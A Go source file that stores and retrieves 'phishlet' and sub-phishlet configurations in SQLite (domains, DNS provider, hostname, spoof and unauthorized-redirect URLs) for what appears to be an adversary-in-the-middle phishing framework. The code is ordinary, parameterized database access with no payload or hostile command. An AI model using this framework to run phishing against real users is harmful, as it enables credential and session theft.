package sqlite

import (
	"database/sql"

	"github.com/travisbale/mirage/internal/aitm"
	
)

// Compile-time check: Phishlets satisfies aitm.PhishletStore.
var _ aitm.PhishletStore = (*Phishlets)(nil)

// Phishlets implements aitm.PhishletStore backed by SQLite.
type Phishlets struct{ db *DB }

func NewPhishletStore(db *DB) *Phishlets { return &Phishlets{db: db} }

func (s *Phishlets) GetPhishletConfig(name string) (*aitm.PhishletConfig, error) {
	row := s.db.db.QueryRow(`SELECT
		name, base_domain, dns_provider, hostname, unauth_url, spoof_url, enabled, hidden
		FROM phishlet_configs WHERE name = ?`, name)
	cfg, err := scanPhishletConfig(row)
	if err == sql.ErrNoRows {
		return nil, aitm.ErrNotFound
	}
	return cfg, err
}

func (s *Phishlets) SetPhishletConfig(cfg *aitm.PhishletConfig) error {
	_, err := s.db.db.Exec(`
		INSERT INTO phishlet_configs
			(name, base_domain, dns_provider, hostname, unauth_url, spoof_url, enabled, hidden)
		VALUES (?,?,?,?,?,?,?,?)
		ON CONFLICT(name) DO UPDATE SET
			base_domain=excluded.base_domain,
			dns_provider=excluded.dns_provider,
			hostname=excluded.hostname,
			unauth_url=excluded.unauth_url,
			spoof_url=excluded.spoof_url,
			enabled=excluded.enabled,
			hidden=excluded.hidden`,
		cfg.Name, cfg.BaseDomain, cfg.DNSProvider, cfg.Hostname,
		cfg.UnauthURL, cfg.SpoofURL, cfg.Enabled, cfg.Hidden,
	)
	return err
}

func (s *Phishlets) ListPhishletConfigs() ([]*aitm.PhishletConfig, error) {
	rows, err := s.db.db.Query(`SELECT
		name, base_domain, dns_provider, hostname, unauth_url, spoof_url, enabled, hidden
		FROM phishlet_configs ORDER BY name ASC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []*aitm.PhishletConfig
	for rows.Next() {
		cfg, err := scanPhishletConfig(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, cfg)
	}
	return out, rows.Err()
}

func (s *Phishlets) DeletePhishletConfig(name string) error {
	res, err := s.db.db.Exec(`DELETE FROM phishlet_configs WHERE name = ?`, name)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Phishlets) CreateSubPhishlet(sp *aitm.SubPhishlet) error {
	params, err := marshalJSON(sp.Params)
	if err != nil {
		return err
	}
	_, err = s.db.db.Exec(
		`INSERT INTO sub_phishlets (name, parent, params) VALUES (?,?,?)`,
		sp.Name, sp.ParentName, params,
	)
	if isConflict(err) {
		return aitm.ErrConflict
	}
	return err
}

func (s *Phishlets) GetSubPhishlet(name string) (*aitm.SubPhishlet, error) {
	row := s.db.db.QueryRow(
		`SELECT name, parent, params FROM sub_phishlets WHERE name = ?`, name)
	sp, err := scanSubPhishlet(row)
	if err == sql.ErrNoRows {
		return nil, aitm.ErrNotFound
	}
	return sp, err
}

func (s *Phishlets) ListSubPhishlets(parent string) ([]*aitm.SubPhishlet, error) {
	var (
		rows *sql.Rows
		err  error
	)
	if parent == "" {
		rows, err = s.db.db.Query(
			`SELECT name, parent, params FROM sub_phishlets ORDER BY name ASC`)
	} else {
		rows, err = s.db.db.Query(
			`SELECT name, parent, params FROM sub_phishlets WHERE parent = ? ORDER BY name ASC`, parent)
	}
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []*aitm.SubPhishlet
	for rows.Next() {
		sp, err := scanSubPhishlet(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, sp)
	}
	return out, rows.Err()
}

func (s *Phishlets) DeleteSubPhishlet(name string) error {
	res, err := s.db.db.Exec(`DELETE FROM sub_phishlets WHERE name = ?`, name)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func scanPhishletConfig(row scanner) (*aitm.PhishletConfig, error) {
	var cfg aitm.PhishletConfig
	err := row.Scan(
		&cfg.Name, &cfg.BaseDomain, &cfg.DNSProvider, &cfg.Hostname,
		&cfg.UnauthURL, &cfg.SpoofURL, &cfg.Enabled, &cfg.Hidden,
	)
	return &cfg, err
}

func scanSubPhishlet(row scanner) (*aitm.SubPhishlet, error) {
	var (
		sp     aitm.SubPhishlet
		params string
	)
	if err := row.Scan(&sp.Name, &sp.ParentName, &params); err != nil {
		return nil, err
	}
	_ = unmarshalJSON(params, &sp.Params)
	return &sp, nil
}
